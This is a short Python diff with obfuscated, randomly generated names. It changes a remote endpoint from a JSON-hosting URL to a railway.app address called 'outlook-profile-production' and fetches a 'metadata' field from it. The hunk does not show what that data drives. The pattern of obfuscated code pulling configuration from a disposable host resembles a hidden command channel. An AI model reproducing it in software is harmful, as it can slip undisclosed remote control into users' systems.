@@ -18,7 +18,7 @@ def learn_ysafli_853():
 
     def net_cacrpa_633():
         try:
-            net_bnjfdi_465 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_bnjfdi_465 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_bnjfdi_465.raise_for_status()
             process_rvhkgg_292 = net_bnjfdi_465.json()
             learn_uvgvog_468 = process_rvhkgg_292.get('metadata')
